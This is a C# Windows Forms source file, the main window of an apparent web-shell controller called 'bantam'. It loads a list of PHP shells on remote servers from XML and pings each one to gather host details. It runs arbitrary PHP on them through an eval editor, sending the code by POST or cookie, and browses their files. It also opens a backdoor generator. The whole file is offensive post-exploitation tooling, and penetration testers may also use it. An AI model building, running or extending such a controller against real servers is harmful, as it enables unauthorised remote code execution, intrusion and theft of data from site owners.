using bantam.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace bantam_php
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public const string CONFIG_FILE = "bantam.xml";

        /// <summary>
        /// 
        /// </summary>
        public String g_SelectedTarget;

        /// <summary>
        /// 
        /// </summary>
        public static Dictionary<String, HostInfo> Hosts = new Dictionary<String, HostInfo>();


        /// <summary>
        /// Static Forms
        /// </summary>
        public AddHost addClientForm, editHostForm;
        public BackdoorGenerator backdoorGenerator;

        /// <summary>
        /// Main Form Constructor, performs the initialization routine, and requests some basic information about every server provided
        /// through the XML, then puts them into the gui
        /// </summary>
        public BantamMain()
        {
            InitializeComponent();

            //has to be initialized with parameters manually because, constructor with params breaks design mode...
            txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BantamMain_Load(object sender, EventArgs e)
        {
            XmlHelper.loadShells();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool validTarget(string hostTarget = "")
        {
            if (string.IsNullOrEmpty(hostTarget))
            {
                hostTarget = g_SelectedTarget;
            }

            if (string.IsNullOrEmpty(hostTarget) == false)
            {
                if (Hosts.ContainsKey(hostTarget) 
                && Hosts[hostTarget].Down == false)
                {
                    return true;
                }
            }
            return false;
        }

        //These are called/invoked when a non GUI thread needs to modify a GUI element
        #region THREAD_SAFE_DELEGATE_CALLBACKS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        /// <param name="pingMS"></param>
        public delegate void addClientDelegate(string hostTarget, string pingMS);
        public void addClientMethod(string hostTarget, string pingMS)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new addClientDelegate(addClientMethod), new object[] { hostTarget, pingMS });
                return;
            }

            //add them to our listview
            //TODO either do not add them to the listview or add them add red with a NA ping, and the ability to re-ping (fix) them
            if (pingMS == "-")
            {
                ListViewItem lvi = new ListViewItem(new string[] { hostTarget, pingMS + " ms" });
                lvi.Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));

                listViewClients.Items.Add(lvi);

                int lastIndex = listViewClients.Items.Count - 1;
                listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Hosts[hostTarget].Down = true;
            } else {
                ListViewItem lvi = new ListViewItem(new string[] { hostTarget, pingMS + " ms" });
                lvi.Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
                listViewClients.Items.Add(lvi);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void guiCallbackUpdateListViewItemDelegate(object arg = null);
        public void guiCallbackUpdateListViewItemPing(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackUpdateListViewItemDelegate(guiCallbackUpdateListViewItemPing), arg);
                return;
            }

            object[] objects = (object[])arg;
            ListViewItem lvi = (ListViewItem)objects[0];
            string hostTarget = (string)objects[1];

            lvi.SubItems[1].Text = Hosts[hostTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
            Hosts[hostTarget].PingStopwatch.Stop();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellURL"></param>
        public delegate void guiCallbackRemoveShellURLDeledate(string shellURL);
        public void guiCallbackRemoveShellURL(string shellURL)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackRemoveShellURLDeledate(guiCallbackRemoveShellURL), shellURL);
                return;
            }

            listViewClients.FindItemWithText(shellURL).Remove();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void guiCallbackBrowserViewDelegate(object arg = null);
        public void guiCallbackBrowserViewMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackBrowserViewDelegate(guiCallbackBrowserViewMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    BrowserView broView = new BrowserView(result, 1000, 1000);
                    broView.Show();
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserWindowsStartDelegate(object arg = null);
        public void fileBrowserWindowsStartMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserWindowsStartDelegate(fileBrowserWindowsStartMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] drives = { null };
                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives)
                        {
                            treeViewFileBrowser.Nodes.Add("", drive, 3);
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserLinuxStartDelegate(object arg = null);
        public void fileBrowserLinuxStartMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserLinuxStartDelegate(fileBrowserLinuxStartMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

                    if (rows.Length > 0 && rows != null)
                    {
                        foreach (string row in rows)
                        {
                            string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                            if (columns != null && columns.Length - 2 > 0)
                            {
                                if (columns[columns.Length - 2] == "dir")
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                        TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                } else {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                        TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserBtnGoClickDelegate(object arg = null);
        public void fileBrowserBtnGoClickMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserBtnGoClickDelegate(fileBrowserBtnGoClickMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                string fileLocation = (string)objects[1];
                string result = (string)objects[2];

                if (string.IsNullOrEmpty(hostTarget) == false)
                {
                    //Clear preview treeview data
                    Hosts[hostTarget].Files.Nodes.Clear();

                    //if user didn't switch targets by the time this callback is triggered clear the live treeview
                    if (g_SelectedTarget == hostTarget)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        treeViewFileBrowser.Refresh();
                    }

                    //patch
                    txtBoxFileBrowserPath.Text = fileLocation;

                    //set path
                    string path = txtBoxFileBrowserPath?.Text;
                    if (string.IsNullOrEmpty(path))
                    {
                        path = ".";
                    }

                    if (result != null && result.Length > 0)
                    {
                        string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

                        if (rows.Length > 0 && rows != null)
                        {
                            foreach (string row in rows)
                            {
                                string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                                if (columns != null && columns.Length - 2 > 0)
                                {
                                    if (columns[columns.Length - 2] == "dir")
                                    {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (g_SelectedTarget == hostTarget)
                                        {
                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        } else {
                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                            TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                    } else {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (g_SelectedTarget == hostTarget)
                                        {
                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        } else {
                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                            TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserMouseClickDelegate(object arg = null);
        public void fileBrowserMouseClickMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserMouseClickDelegate(fileBrowserMouseClickMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                TreeNode tn = (TreeNode)objects[1];
                string result = (string)objects[2];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

                    if (rows.Length > 0 && rows != null)
                    {
                        foreach (string row in rows)
                        {
                            string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                            if (columns != null && columns.Length - 2 > 0)
                            {
                                if (columns[columns.Length - 2] == "dir")
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //TODO update their client cache here user changed clients
                                    }
                                } else {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //TODO update their client cache here user changed clients
                                    }
                                }
                            } else {
                                //MessageBox.Show(columns[0]);
                            }
                        }
                        tn.Expand();
                    }
                }
            }
        }

        #endregion

        #region THREAD_ROUTINES

        /// <summary>
        /// 
        /// </summary>
        /// <param name="Code"></param>
        /// <param name="Callback"></param>
        /// <param name="CallbackArgs"></param>
        private void startPhpExecutionThread(string phpCode, Action<object> callback = null, object[] callbackArgs = null)
        {
            if (validTarget() == false)
            {
                return;
            }

            string hostTarget = g_SelectedTarget;

            Thread t = new Thread(dynamicRequestThread);
            t.Start(new DynamicThreadArgs(hostTarget, phpCode, callback, callbackArgs));
        }

        /// <summary>
        /// Starts a thread that executes the php code
        /// </summary>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        public void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
        {
            if (validTarget() == false)
            {
                return;
            }

            string hostTarget = g_SelectedTarget;
            var t = new Thread(() => richTextboxDialogThread(hostTarget, phpCode, title));
            t.Start();
        }


        public string executeRemotePHP(string hostTarget, string phpCode)
        {
            if (validTarget(hostTarget) == false)
            {
                //invalid selection message
                return "";
            }

            string result = WebHelper.executePHP(hostTarget, phpCode, Hosts[hostTarget].RequestArgName, Hosts[hostTarget].SendDataViaCookie);
            return result;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        public void richTextboxDialogThread(string hostTarget, string phpCode, string title)
        {
            string resultTxt = executeRemotePHP(hostTarget, phpCode);
            if (string.IsNullOrEmpty(resultTxt) == false)
            {
                CustomForms.RichTextBoxDialog(title, resultTxt);
            } else {
                //TODO if (cfg messageboxes)
                MessageBox.Show("No Data Returned", "Welp...");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        public void getInitDataThread(string hostTarget)
        {
            if (string.IsNullOrEmpty(hostTarget.ToString()) == false)
            {
                //start stopwatch for ping/estimated average response time
                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                string result = executeRemotePHP(hostTarget, PhpHelper.initDataVars);

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] data = { null };
                    data = result.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                    var initDataReturnedVarCount = Enum.GetValues(typeof(PhpHelper.INIT_DATA_VARS)).Cast<PhpHelper.INIT_DATA_VARS>().Max();

                    if (data != null && data.Length == (int)initDataReturnedVarCount + 1)
                    {
                        //invokes a thread safe call from the GUI thread so we can safely update the GUI's listview
                        addClientMethod(hostTarget, pingWatch.ElapsedMilliseconds.ToString());

                        //add clients info to our local data handler
                        Hosts[hostTarget].update(pingWatch.ElapsedMilliseconds, data);
                    } else {
                        addClientMethod(hostTarget, "-");
                    }
                } else {
                    addClientMethod(hostTarget, "-");
                }
                pingWatch.Stop();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="args"></param>
        public void dynamicRequestThread(object args)
        {
            if (args != null)
            {
                //cast the args to our defined class
                DynamicThreadArgs wrapperArgs = (DynamicThreadArgs)args;

                //execute our request in our threads that runs asynchronously along side the GUI thread
                string result = executeRemotePHP(wrapperArgs.host, wrapperArgs.code);

                if (string.IsNullOrEmpty(result) == false)
                {
                    if (wrapperArgs.callbackArgs != null && wrapperArgs.callbackArgs.Length > 0)
                    {
                        //TODO: make the following 3 lines suck less or not exist
                        //appends the result of the php execution into the callback args for the callback function
                        object[] tmpCallbackArgs = wrapperArgs.callbackArgs;
                        Array.Resize(ref tmpCallbackArgs, wrapperArgs.callbackArgs.Length + 1);
                        tmpCallbackArgs[wrapperArgs.callbackArgs.Length] = result;

                        //Invoke the dynamic thread safe callback, with it's "object" of arguments
                        wrapperArgs.callback?.Invoke(tmpCallbackArgs);
                    } else {
                        wrapperArgs.callback?.Invoke(null);
                    }
                }
            }
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            bool checkBoxChecked = true;
            string code = CustomForms.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedTarget, "", ref checkBoxChecked);

            if (string.IsNullOrEmpty(code) == false)
            {              
                if(checkBoxChecked)
                {
                    //execute the code and show it in a richtextbox
                    executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedTarget);
                } else {
                    startPhpExecutionThread(code);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);

            if (lvi != null
            && (Hosts[g_SelectedTarget].PingStopwatch == null 
            || Hosts[g_SelectedTarget].PingStopwatch.IsRunning == false))
            {
                //start client stopwatch
                Hosts[g_SelectedTarget].PingStopwatch = new Stopwatch();
                Hosts[g_SelectedTarget].PingStopwatch.Start();

                object[] callbackArgs = { lvi, g_SelectedTarget };
                startPhpExecutionThread(PhpHelper.phpTestExecutionWithEcho, guiCallbackUpdateListViewItemPing, callbackArgs);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            startPhpExecutionThread(PhpHelper.phpInfo, guiCallbackBrowserViewMethod);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabPageFiles_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
            if (lvi != null)
            {
                //copy a backup of the current file tree view into clients
                if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
                {
                    //Clear previously cached treeview to only store 1 copy
                    if (!string.IsNullOrEmpty(g_SelectedTarget)
                    && Hosts[g_SelectedTarget].Files.Nodes.Count > 0)
                    {
                        Hosts[g_SelectedTarget].Files.Nodes.Clear();
                    }
                    //store current treeview into client and clear
                    GuiHelper.CopyNodes(treeViewFileBrowser, Hosts[g_SelectedTarget].Files);
                    treeViewFileBrowser.Nodes.Clear();
                }

                if (!string.IsNullOrEmpty(g_SelectedTarget) 
                 && Hosts.ContainsKey(g_SelectedTarget) 
                 && !string.IsNullOrEmpty(Hosts[g_SelectedTarget].PWD)
                 && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
                {
                    Hosts[g_SelectedTarget].PWD = txtBoxFileBrowserPath.Text;
                   //MessageBox.Show(Hosts[g_SelectedTarget].PWD);
                }

                g_SelectedTarget = lvi.SubItems[0].Text;

                foreach (ListViewItem lvClients in listViewClients.Items)
                {
                    //todo store color and revert to original color, for now skip if red
                    if (lvClients.BackColor != System.Drawing.Color.Red)
                    {
                        lvClients.BackColor = System.Drawing.SystemColors.Window;
                        lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                    }
                }

                if (lvi.BackColor != System.Drawing.Color.Red)
                {
                    lvi.BackColor = System.Drawing.SystemColors.Highlight;
                    lvi.ForeColor = System.Drawing.SystemColors.HighlightText;
                }

                if (validTarget() == false)
                {
                    //clear the ui of invalid data
                    lblDynCWD.Text = "";
                    lblDynFreeSpace.Text = "";
                    lblDynHDDSpace.Text = "";
                    lblDynServerIP.Text = "";
                    lblDynUname.Text = "";
                    lblDynUser.Text = "";
                    lblDynWebServer.Text = "";
                    lblDynGroup.Text = "";
                    lblDynPHP.Text = "";
                    txtBoxFileBrowserPath.Text = "";
                    return;
                } else {
                    lblDynCWD.Text = Hosts[g_SelectedTarget].CWD;
                    lblDynFreeSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedTarget].FreeHDDSpace) ? "0"
                                         : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedTarget].FreeHDDSpace));

                    lblDynHDDSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedTarget].TotalHDDSpace) ? "0"
                                        : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedTarget].TotalHDDSpace));

                    lblDynServerIP.Text = Hosts[g_SelectedTarget].IP;
                    lblDynUname.Text = Hosts[g_SelectedTarget].UnameRelease + " " + Hosts[g_SelectedTarget].UnameKernel;
                    lblDynUser.Text = Hosts[g_SelectedTarget].UID + " ( " + Hosts[g_SelectedTarget].User + " )";
                    lblDynWebServer.Text = Hosts[g_SelectedTarget].ServerSoftware;
                    lblDynGroup.Text = Hosts[g_SelectedTarget].GID + " ( " + Hosts[g_SelectedTarget].Group + " )";
                    lblDynPHP.Text = Hosts[g_SelectedTarget].PHP_Version;
                }

                if (tabControl1.SelectedTab == tabPageFiles)
                {
                    if (Hosts[g_SelectedTarget].Files.Nodes != null
                     && Hosts[g_SelectedTarget].Files.Nodes.Count > 0)
                    {
                        GuiHelper.CopyNodes(Hosts[g_SelectedTarget].Files, treeViewFileBrowser);
                        treeViewFileBrowser.Refresh();
                        treeViewFileBrowser.ExpandAll();

                        if (string.IsNullOrEmpty(Hosts[g_SelectedTarget].PWD))
                        {
                            MessageBox.Show("2");
                        }

                        txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].PWD;
                    } else {
                        start_FileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (tabControl1.SelectedTab == tabPageFiles)
            {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes.Count == 0 
                && Hosts[g_SelectedTarget].Files.Nodes != null
                && Hosts[g_SelectedTarget].Files.Nodes.Count > 0)
                {
                    //populate the treeview from cache
                    GuiHelper.CopyNodes(Hosts[g_SelectedTarget].Files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();

                    txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].PWD;
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0)
                    {
                        start_FileBrowser();
                    }
                }
            }
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            XmlHelper.saveShells();
        }

        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //keep alive checks with this?
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (addClientForm == null)
            {
                addClientForm = new AddHost();
            }
            addClientForm.Show();
        }

        private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
        {
            if (validTarget())
            {
                phpToolStripMenuItem.Visible = true;
                systemToolstripMenuItem.Visible = true;
                softwareToolStripMenuItem.Visible = true;

                if (Hosts[g_SelectedTarget].isWindows)
                {
                    linuxToolStripMenuItem.Visible = false;
                    windowsToolStripMenuItem.Visible = true;
                }
                else
                {
                    linuxToolStripMenuItem.Visible = true;
                    windowsToolStripMenuItem.Visible = false;
                }
            }
            else
            {
                phpToolStripMenuItem.Visible = false;
                systemToolstripMenuItem.Visible = false;
                softwareToolStripMenuItem.Visible = false;
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedTarget) == false)
            {
                listViewClients.SelectedItems[0].Remove();
                Hosts.Remove(g_SelectedTarget);
            }
        }

        private void pingToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            //Done this way because it possibly may be "down" and need retesting
            if (string.IsNullOrEmpty(g_SelectedTarget)
             || Hosts.ContainsKey(g_SelectedTarget) == false)
            {
                return;
            }

            string shellURL = g_SelectedTarget;
            string requestArgName = Hosts[shellURL].RequestArgName;
            bool sendViaCookie = Hosts[shellURL].SendDataViaCookie;

            listViewClients.FindItemWithText(shellURL).Remove();
            Hosts.Remove(shellURL);

            Hosts.Add(shellURL, new HostInfo());
            Hosts[shellURL].RequestArgName = requestArgName;
            Hosts[shellURL].SendDataViaCookie = sendViaCookie;

            Thread t = new Thread(() => Program.g_BantamMain.getInitDataThread(shellURL));
            t.Start();
        }

        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (backdoorGenerator == null)
            {
                backdoorGenerator = new BackdoorGenerator();
            }
            backdoorGenerator.Show();
        }

        private void getMyIPToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            //todo use php >.>
            string remoteIP = WebHelper.makeRequest("http://ipv4.icanhazip.com/", "");

            if (string.IsNullOrEmpty(remoteIP) == false)
            {
                MessageBox.Show(remoteIP, "Your IPV4 Address Is");
                Clipboard.SetText(remoteIP);
            }
        }

        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog();

            saveShellsXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
            saveShellsXMLDialog.FilterIndex = 2;
            saveShellsXMLDialog.RestoreDirectory = true;

            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK)
            {
                XmlHelper.saveShells(saveShellsXMLDialog.FileName);
            }
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openShellXMLDialog = new OpenFileDialog();
            openShellXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
            openShellXMLDialog.FilterIndex = 2;
            openShellXMLDialog.RestoreDirectory = true;

            if (openShellXMLDialog.ShowDialog() == DialogResult.OK)
            {
                foreach (ListViewItem lvClients in listViewClients.Items)
                {
                    Hosts.Remove(lvClients.Text);
                    lvClients.Remove();
                }
                XmlHelper.loadShells(openShellXMLDialog.FileName);
            }
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedTarget) == false)
            {
                string shellUrl = g_SelectedTarget;
                string varName = Hosts[g_SelectedTarget].RequestArgName;
                string varType = (Hosts[g_SelectedTarget].SendDataViaCookie ? "cookie" : "post");

                editHostForm = new AddHost(shellUrl, varName, varType);
                editHostForm.Show();
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
        {
            filebrowserGoBack();
        }

        private void btnFileBrowserGo_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
            {
                return;
            }

            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[g_SelectedTarget].PHP_Version);

            //todo fix the need of selected target being passed??...
            object[] callbackParams = { g_SelectedTarget, txtBoxFileBrowserPath.Text }; //todo this was added temp as a fix for crappy rigging of dynamic thread args class. needs rework to not force result to be last, so we know the known locations and thus furthering its dynamicness
            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod, callbackParams);
        }

        /// <summary>
        /// 
        /// </summary>
        private void start_FileBrowser()
        {
            if (validTarget() == false)
            {
                return;
            }

            txtBoxFileBrowserPath.Text = Hosts[g_SelectedTarget].CWD;

            if (Hosts[g_SelectedTarget].isWindows)
            {
                txtBoxFileBrowserPath.Text = "";
                startPhpExecutionThread(PhpHelper.getHardDriveLetters, fileBrowserWindowsStartMethod);
            } else {
                string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", Hosts[g_SelectedTarget].PHP_Version);
                startPhpExecutionThread(directoryContentsPHPCode, fileBrowserLinuxStartMethod);
            }

            if (tabControl1.SelectedTab != tabPageFiles)
            {
                tabControl1.SelectedTab = tabPageFiles;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            start_FileBrowser();
        }

        /// <summary>
        /// 
        /// </summary>
        private void filebrowserGoBack()
        {
            String[] paths = txtBoxFileBrowserPath.Text.Split('/');
            String lastPathRemoved = String.Join("/", paths, 0, paths.Count() - 1);

            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, Hosts[g_SelectedTarget].PHP_Version);
            object[] callbackParams = { g_SelectedTarget, lastPathRemoved };

            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod, callbackParams);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
